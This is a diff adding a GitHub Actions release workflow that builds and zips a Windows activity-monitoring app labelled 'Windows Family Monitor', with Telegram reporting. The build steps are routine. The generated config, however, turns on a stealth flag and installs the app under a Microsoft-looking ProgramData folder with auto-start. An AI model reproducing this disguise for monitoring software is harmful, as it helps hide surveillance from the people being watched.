@@ -1,0 +1,227 @@
+name: Create Release
+
+on:
+  push:
+    tags:
+      - 'v*.*.*'
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+      
+    - name: Setup .NET
+      uses: actions/setup-dotnet@v4
+      with:
+        dotnet-version: '8.0.x'
+        
+    - name: Get version from tag
+      id: get_version
+      run: |
+        $version = "${{ github.ref_name }}" -replace '^v', ''
+        echo "VERSION=$version" >> $env:GITHUB_OUTPUT
+        echo "Version: $version"
+      shell: pwsh
+        
+    - name: Build and publish
+      run: |
+        dotnet publish sample1.csproj `
+          -c Release `
+          -r win-x64 `
+          --self-contained true `
+          -p:PublishSingleFile=true `
+          -p:IncludeNativeLibrariesForSelfExtract=true `
+          -p:PublishTrimmed=false `
+          -p:DebugType=None `
+          -p:DebugSymbols=false
+      shell: pwsh
+      
+    - name: Create Release package
+      run: |
+        $releaseDir = "Release"
+        $archivePath = "Release.zip"
+        
+        # Create Release directory
+        New-Item -Path $releaseDir -ItemType Directory -Force | Out-Null
+        
+        # Copy executable
+        $publishExe = "bin\Release\net8.0-windows\win-x64\publish\sample1.exe"
+        Copy-Item -Path $publishExe -Destination "$releaseDir\sample1.exe" -Force
+        
+        # Create clean appsettings.json
+        $cleanConfig = @{
+          Logging = @{
+            LogLevel = @{
+              Default = "Information"
+              "Microsoft.Hosting.Lifetime" = "Information"
+            }
+          }
+          Telegram = @{
+            BotToken = "YOUR_BOT_TOKEN_HERE"
+            AuthorizedUsers = @()
+            ReportTime = "19:00"
+            MaxFailedAttempts = 5
+          }
+          Monitoring = @{
+            ProcessCheckIntervalMs = 1000
+            NetworkCheckIntervalMs = 5000
+            DataSaveIntervalMs = 60000
+            MaxCpuPercent = 2.0
+            MaxMemoryMB = 50
+          }
+          Database = @{
+            FilePath = "activity.db"
+            DataRetentionDays = 7
+          }
+          Security = @{
+            EncryptionKey = "GENERATE_ON_INSTALL"
+            EnableStealth = $true
+          }
+          SystemProcesses = @(
+            "explorer", "svchost", "dllhost", "conhost", "dwm", 
+            "taskhostw", "runtimebroker", "csrss", "smss", "wininit"
+          )
+          SystemDomains = @(
+            "microsoft.com", "windowsupdate.com", "ntp.org", 
+            "akamai.net", "google.com", "gstatic.com"
+          )
+        }
+        $cleanConfig | ConvertTo-Json -Depth 10 | Set-Content "$releaseDir\appsettings.json" -Encoding UTF8
+        
+        # Copy installation scripts
+        Copy-Item -Path "install.ps1" -Destination $releaseDir -Force
+        Copy-Item -Path "uninstall.ps1" -Destination $releaseDir -Force
+        
+        # Create README.txt
+        $readmeContent = @"
+        ======================================================================
+          WINDOWS FAMILY MONITOR - Release ${{ steps.get_version.outputs.VERSION }}
+        ======================================================================
+        
+        SYSTEM REQUIREMENTS:
+          - Windows 10/11 (64-bit)
+          - Administrator privileges
+          - Internet connection for Telegram Bot
+        
+        QUICK START:
+          1. Extract this archive to any folder
+          2. Right-click PowerShell and select "Run as Administrator"
+          3. Navigate to extracted folder
+          4. Run: .\install.ps1
+          5. Follow the on-screen instructions
+        
+        INSTALLATION:
+          The install.ps1 script will:
+          - Request Telegram Bot Token (get from @BotFather)
+          - Request your Telegram User ID (get from @userinfobot)
+          - Install the monitor to system directory
+          - Create auto-start task via Task Scheduler
+          - Configure daily reports at 19:00
+        
+        UNINSTALLATION:
+          Run: .\uninstall.ps1
+        
+        TELEGRAM COMMANDS:
+          /start - Start the bot
+          /report - Get current day report
+          /stats - View statistics
+          /help - Show all available commands
+        
+        FILES INCLUDED:
+          - sample1.exe - Main application (~51 MB, self-contained)
+          - appsettings.json - Configuration template
+          - install.ps1 - Installation script
+          - uninstall.ps1 - Uninstallation script
+          - README.txt - This file
+        
+        INSTALLATION LOCATION:
+          C:\ProgramData\Microsoft\NetworkDiagnostics\
+        
+        LOGS LOCATION:
+          C:\ProgramData\Microsoft\NetworkDiagnostics\Logs\
+        
+        SUPPORT:
+          For issues and updates: https://github.com/${{ github.repository }}
+        
+        ======================================================================
+        "@
+        $readmeContent | Set-Content "$releaseDir\README.txt" -Encoding UTF8
+        
+        # Create archive
+        Compress-Archive -Path "$releaseDir\*" -DestinationPath $archivePath -Force
+        
+        # Get sizes
+        $exeSize = (Get-Item "$releaseDir\sample1.exe").Length / 1MB
+        $archiveSize = (Get-Item $archivePath).Length / 1MB
+        
+        Write-Host "Executable size: $([math]::Round($exeSize, 2)) MB"
+        Write-Host "Archive size: $([math]::Round($archiveSize, 2)) MB"
+        
+        # Calculate SHA256
+        $hash = Get-FileHash $archivePath -Algorithm SHA256
+        $hash.Hash | Set-Content "Release.zip.sha256" -Encoding UTF8
+        
+        Write-Host "SHA256: $($hash.Hash)"
+      shell: pwsh
+      
+    - name: Create Release Notes
+      id: release_notes
+      run: |
+        $notes = @"
+        ## Windows Family Monitor ${{ steps.get_version.outputs.VERSION }}
+        
+        ### Installation
+        
+        1. Download ``Release.zip``
+        2. Extract to any folder
+        3. Run PowerShell as Administrator
+        4. Execute: ``.\install.ps1``
+        5. Follow the setup wizard
+        
+        ### What's Included
+        
+        - ``sample1.exe`` - Self-contained application (~51 MB)
+        - ``install.ps1`` - Automated installation script
+        - ``uninstall.ps1`` - Complete removal script
+        - ``appsettings.json`` - Configuration template
+        - ``README.txt`` - User guide
+        
+        ### Requirements
+        
+        - Windows 10/11 (64-bit)
+        - Administrator privileges
+        - Telegram Bot Token (from @BotFather)
+        
+        ### Verification
+        
+        SHA256 checksum is provided in ``Release.zip.sha256``
+        
+        ### Support
+        
+        Report issues at: https://github.com/${{ github.repository }}/issues
+        "@
+        
+        $notes | Set-Content "RELEASE_NOTES.md" -Encoding UTF8
+        
+        # Output for GitHub
+        $notes | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
+      shell: pwsh
+      
+    - name: Create GitHub Release
+      uses: softprops/action-gh-release@v1
+      with:
+        files: |
+          Release.zip
+          Release.zip.sha256
+        body_path: RELEASE_NOTES.md
+        draft: false
+        prerelease: false
+        generate_release_notes: true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
